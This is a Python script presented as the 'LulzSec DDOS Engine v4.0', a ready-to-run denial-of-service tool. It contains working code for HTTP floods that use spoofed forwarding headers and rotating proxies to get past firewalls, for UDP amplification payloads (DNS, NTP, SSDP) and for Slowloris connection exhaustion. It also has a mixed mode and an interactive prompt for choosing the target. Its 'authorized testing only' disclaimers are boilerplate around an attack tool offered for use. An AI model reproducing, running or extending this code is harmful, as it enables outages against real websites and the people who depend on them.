#!/usr/bin/env python3
"""
LULZSEC DDOS ENGINE v4.0 - HYBRID ATTACK TOOL
Author: ZinXploit
Description: Advanced DDOS tool with multiple attack vectors and firewall bypass
WARNING: FOR EDUCATIONAL AND AUTHORIZED PENETRATION TESTING ONLY
"""

import socket
import threading
import random
import time
import sys
import ssl
import http.client
import urllib.request
import urllib.parse
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent
from colorama import init, Fore, Style

# Initialize colors
init(autoreset=True)

class LulzSecDDOS:
    def __init__(self):
        self.target = None
        self.port = 80
        self.attack_method = "mixed"
        self.threads = 1000
        self.duration = 300
        self.packet_size = 1024
        self.proxies = []
        self.user_agents = []
        self.is_attacking = False
        self.stats = {
            'packets_sent': 0,
            'successful_hits': 0,
            'failed_requests': 0,
            'bytes_sent': 0,
            'start_time': 0
        }
        
        # Load resources
        self.load_user_agents()
        self.load_proxy_list()
    
    def load_user_agents(self):
        """Load random user agents for HTTP attacks"""
        ua = UserAgent()
        self.user_agents = [ua.random for _ in range(100)]
    
    def load_proxy_list(self):
        """Load proxy list for IP rotation"""
        # You need to provide your own proxy list or use a proxy API
        self.proxies = [
            # Add your proxies here in format: ip:port
            # Or use: self.fetch_proxies_from_api()
        ]
    
    def fetch_proxies_from_api(self):
        """Fetch fresh proxies from free proxy APIs"""
        proxy_sources = [
            "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"
        ]
        
        import requests
        for source in proxy_sources:
            try:
                response = requests.get(source, timeout=10)
                proxies = response.text.split('\n')
                self.proxies.extend([p.strip() for p in proxies if p.strip()])
                print(f"[+] Loaded {len(proxies)} proxies from {source}")
            except:
                continue
        
        # Remove duplicates
        self.proxies = list(set(self.proxies))
        print(f"[+] Total unique proxies: {len(self.proxies)}")
    
    def generate_random_ip(self):
        """Generate random spoofed IP address"""
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    def create_syn_packet(self):
        """Create raw SYN packet for SYN flood"""
        # Note: This requires root/admin privileges
        try:
            from scapy.all import IP, TCP, RandIP, RandShort
            ip = IP(dst=self.target, src=RandIP())
            tcp = TCP(sport=RandShort(), dport=self.port, flags="S", seq=random.randint(1000, 9000))
            packet = ip/tcp
            return packet
        except ImportError:
            print("[-] Scapy not installed. Install: pip install scapy")
            return None
        except Exception as e:
            print(f"[-] Error creating SYN packet: {e}")
            return None
    
    def http_flood_attack(self):
        """HTTP/HTTPS Layer 7 Flood Attack"""
        url = f"http://{self.target}" if self.port == 80 else f"https://{self.target}:{self.port}"
        
        # Common attack paths
        paths = [
            "/", "/wp-admin", "/admin", "/phpmyadmin", "/login", "/api", 
            "/search", "/contact", "/about", "/blog", "/news",
            "/wp-content/uploads/", "/images/", "/static/", "/assets/"
        ]
        
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        }
        
        # Add random headers to bypass WAF
        fake_headers = [
            ('X-Forwarded-For', self.generate_random_ip()),
            ('X-Real-IP', self.generate_random_ip()),
            ('CF-Connecting-IP', self.generate_random_ip()),
            ('X-Client-IP', self.generate_random_ip()),
            ('True-Client-IP', self.generate_random_ip()),
        ]
        
        headers.update(dict(fake_headers))
        
        while self.is_attacking:
            try:
                # Randomize request type
                if random.random() > 0.5:
                    # GET request
                    path = random.choice(paths) + "?" + "&".join([f"param{random.randint(1,100)}={random.random()}" for _ in range(random.randint(1,10))])
                    req = urllib.request.Request(f"{url}{path}", headers=headers, method='GET')
                else:
                    # POST request with random data
                    data = urllib.parse.urlencode({
                        f"field{random.randint(1,20)}": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=random.randint(10,1000)))
                    }).encode()
                    req = urllib.request.Request(url, data=data, headers=headers, method='POST')
                
                # Use proxy if available
                if self.proxies:
                    proxy = random.choice(self.proxies)
                    proxy_handler = urllib.request.ProxyHandler({'http': f'http://{proxy}', 'https': f'http://{proxy}'})
                    opener = urllib.request.build_opener(proxy_handler)
                    urllib.request.install_opener(opener)
                
                # Send request
                with urllib.request.urlopen(req, timeout=5) as response:
                    self.stats['successful_hits'] += 1
                    self.stats['bytes_sent'] += len(data) if 'data' in locals() else 0
                
            except Exception as e:
                self.stats['failed_requests'] += 1
            
            self.stats['packets_sent'] += 1
    
    def udp_amplification_attack(self):
        """UDP Amplification Attack using vulnerable protocols"""
        amplification_vectors = {
            53: ("DNS", b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x01'),
            123: ("NTP", b'\x17\x00\x03\x2a' + b'\x00' * 40),
            1900: ("SSDP", b'M-SEARCH * HTTP/1.1\r\nHost: 239.255.255.250:1900\r\nMan: "ssdp:discover"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n'),
            27960: ("Quake", b'\xff\xff\xff\xffgetstatus'),
        }
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        while self.is_attacking:
            try:
                # Randomly select amplification vector
                port, (protocol, payload) = random.choice(list(amplification_vectors.items()))
                
                # Send to random IP (reflector attack simulation)
                # In real attack, you'd use vulnerable servers as reflectors
                sock.sendto(payload, (self.target, port))
                
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += len(payload)
                
                # Small delay to avoid socket blocking
                time.sleep(0.001)
                
            except Exception as e:
                self.stats['failed_requests'] += 1
                time.sleep(0.1)
        
        sock.close()
    
    def slowloris_attack(self):
        """Slowloris Attack - Keep many connections open"""
        sockets = []
        
        try:
            # Create multiple sockets
            for _ in range(100):  # Adjust based on system limits
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((self.target, self.port))
                    
                    # Send partial HTTP request
                    s.send(f"GET / HTTP/1.1\r\n".encode())
                    s.send(f"Host: {self.target}\r\n".encode())
                    s.send("User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n".encode())
                    sockets.append(s)
                    self.stats['packets_sent'] += 1
                except:
                    continue
            
            # Keep connections alive
            while self.is_attacking and sockets:
                for s in sockets[:]:
                    try:
                        # Send keep-alive headers
                        s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                        self.stats['bytes_sent'] += 10
                        time.sleep(random.randint(10, 100) / 1000)
                    except:
                        sockets.remove(s)
                        self.stats['failed_requests'] += 1
                
                # Replenish closed sockets
                while len(sockets) < 50 and self.is_attacking:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(4)
                        s.connect((self.target, self.port))
                        s.send(f"GET / HTTP/1.1\r\n".encode())
                        sockets.append(s)
                        self.stats['packets_sent'] += 1
                    except:
                        break
                
                time.sleep(1)
        
        finally:
            # Clean up
            for s in sockets:
                try:
                    s.close()
                except:
                    pass
    
    def mixed_brutal_attack(self):
        """Mixed attack using all methods"""
        attack_methods = [
            self.http_flood_attack,
            self.udp_amplification_attack,
            self.slowloris_attack,
        ]
        
        # Distribute threads among methods
        threads_per_method = max(1, self.threads // len(attack_methods))
        
        with ThreadPoolExecutor(max_workers=len(attack_methods)) as executor:
            futures = []
            for method in attack_methods:
                for _ in range(threads_per_method):
                    futures.append(executor.submit(method))
            
            # Wait for attack duration
            time.sleep(self.duration)
            self.is_attacking = False
            
            # Wait for all threads
            for future in futures:
                try:
                    future.result(timeout=1)
                except:
                    pass
    
    def start_attack(self, target, port=80, method="mixed", threads=1000, duration=300):
        """Start the DDOS attack"""
        self.target = target
        self.port = port
        self.attack_method = method
        self.threads = threads
        self.duration = duration
        self.is_attacking = True
        self.stats = {
            'packets_sent': 0,
            'successful_hits': 0,
            'failed_requests': 0,
            'bytes_sent': 0,
            'start_time': time.time()
        }
        
        print(Fore.RED + f"""
        ╔══════════════════════════════════════════════════════╗
        ║                LULZSEC DDOS ENGINE v4.0              ║
        ╠══════════════════════════════════════════════════════╣
        ║ Target: {target:45} ║
        ║ Port: {port:<45} ║
        ║ Method: {method:44} ║
        ║ Threads: {threads:<43} ║
        ║ Duration: {duration}s{40*' '} ║
        ╚══════════════════════════════════════════════════════╝
        """)
        
        print(Fore.YELLOW + "[!] Starting attack in 3 seconds...")
        time.sleep(3)
        
        # Start attack based on method
        if method == "http":
            attack_func = self.http_flood_attack
        elif method == "udp":
            attack_func = self.udp_amplification_attack
        elif method == "slowloris":
            attack_func = self.slowloris_attack
        elif method == "mixed":
            attack_func = self.mixed_brutal_attack
        else:
            print(Fore.RED + "[-] Unknown attack method!")
            return
        
        # Start attack threads
        print(Fore.GREEN + f"[+] Launching {threads} attack threads...")
        
        if method == "mixed":
            # Mixed attack handles its own threading
            attack_func()
        else:
            with ThreadPoolExecutor(max_workers=threads) as executor:
                futures = []
                for _ in range(threads):
                    futures.append(executor.submit(attack_func))
                
                # Run for specified duration
                time.sleep(duration)
                self.is_attacking = False
                
                # Wait for threads to finish
                print(Fore.YELLOW + "[!] Stopping attack threads...")
                for future in futures:
                    try:
                        future.result(timeout=2)
                    except:
                        pass
        
        # Show final statistics
        self.show_stats()
    
    def show_stats(self):
        """Display attack statistics"""
        elapsed = time.time() - self.stats['start_time']
        
        print(Fore.CYAN + "\n" + "═" * 60)
        print(Fore.WHITE + Style.BRIGHT + "ATTACK COMPLETED - FINAL STATISTICS")
        print(Fore.CYAN + "═" * 60)
        
        print(Fore.GREEN + f"[+] Duration: {elapsed:.2f} seconds")
        print(Fore.GREEN + f"[+] Packets Sent: {self.stats['packets_sent']:,}")
        print(Fore.GREEN + f"[+] Successful Hits: {self.stats['successful_hits']:,}")
        print(Fore.RED + f"[+] Failed Requests: {self.stats['failed_requests']:,}")
        
        if elapsed > 0:
            packets_per_sec = self.stats['packets_sent'] / elapsed
            print(Fore.YELLOW + f"[+] Packets/Second: {packets_per_sec:,.2f}")
        
        mb_sent = self.stats['bytes_sent'] / (1024 * 1024)
        print(Fore.YELLOW + f"[+] Bandwidth Used: {mb_sent:.2f} MB")
        
        if self.stats['packets_sent'] > 0:
            success_rate = (self.stats['successful_hits'] / self.stats['packets_sent']) * 100
            print(Fore.CYAN + f"[+] Success Rate: {success_rate:.2f}%")
        
        print(Fore.CYAN + "═" * 60)
        print(Fore.RED + "[!] Attack finished. Target may be experiencing downtime.")
        print(Fore.RED + "[!] Remember: This tool is for authorized testing only!\n")

def print_banner():
    banner = Fore.RED + r"""
     _      _      _      _____ _______ ______ _____  
    | |    | |    | |    / ____|__   __|  ____|  __ \ 
    | |    | |    | |   | (___    | |  | |__  | |  | |
    | |    | |    | |    \___ \   | |  |  __| | |  | |
    | |____| |____| |____ ____) |  | |  | |____| |__| |
    |______|______|______|_____/   |_|  |______|_____/ 
    
    """ + Fore.YELLOW + """
    ╔═══════════════════════════════════════════════════════════╗
    ║                   DDOS ATTACK TOOL v4.0                   ║
    ║         LulzSec Indonesia - ZinXploit & Toxcar Team       ║
    ╚═══════════════════════════════════════════════════════════╝
    """ + Fore.WHITE + """
    [!] WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY
    [!] Misuse of this tool is illegal and punishable by law
    [!] The developer is not responsible for any illegal usage
    """
    print(banner)

def main():
    print_banner()
    
    # Create DDOS engine
    ddos = LulzSecDDOS()
    
    # Get user input
    try:
        target = input(Fore.CYAN + "[?] Enter target IP/Domain: " + Fore.WHITE)
        if not target:
            target = "example.com"
        
        port = input(Fore.CYAN + "[?] Enter target port (default 80): " + Fore.WHITE)
        port = int(port) if port else 80
        
        print(Fore.CYAN + "\n[+] Available attack methods:")
        print(Fore.GREEN + "    1. HTTP Flood (Layer 7)")
        print(Fore.GREEN + "    2. UDP Amplification")
        print(Fore.GREEN + "    3. Slowloris")
        print(Fore.GREEN + "    4. Mixed Brutal Mode (Recommended)")
        
        method_choice = input(Fore.CYAN + "[?] Select method (1-4, default 4): " + Fore.WHITE)
        methods = {1: "http", 2: "udp", 3: "slowloris", 4: "mixed"}
        method = methods.get(int(method_choice) if method_choice else 4, "mixed")
        
        threads = input(Fore.CYAN + "[?] Number of threads (default 1000): " + Fore.WHITE)
        threads = int(threads) if threads else 1000
        
        duration = input(Fore.CYAN + "[?] Attack duration in seconds (default 300): " + Fore.WHITE)
        duration = int(duration) if duration else 300
        
        # Confirm attack
        print(Fore.RED + f"\n[!] ATTACK CONFIGURATION:")
        print(Fore.RED + f"    Target: {target}:{port}")
        print(Fore.RED + f"    Method: {method}")
        print(Fore.RED + f"    Threads: {threads}")
        print(Fore.RED + f"    Duration: {duration} seconds")
        
        confirm = input(Fore.YELLOW + "\n[?] Confirm attack? (y/N): " + Fore.WHITE)
        if confirm.lower() != 'y':
            print(Fore.YELLOW + "[!] Attack cancelled.")
            sys.exit(0)
        
        # Start attack
        ddos.start_attack(target, port, method, threads, duration)
        
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Attack interrupted by user.")
        ddos.is_attacking = False
        time.sleep(1)
        ddos.show_stats()
    except Exception as e:
        print(Fore.RED + f"[-] Error: {e}")
        import traceback
        traceback.print_exc()

if __name__ == "__main__":
    # Check if running with admin privileges (for raw sockets)
    if sys.platform == "win32":
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print(Fore.RED + "[!] Warning: Running without admin privileges.")
            print(Fore.RED + "[!] Some features (SYN flood) may not work.")
    
    main()
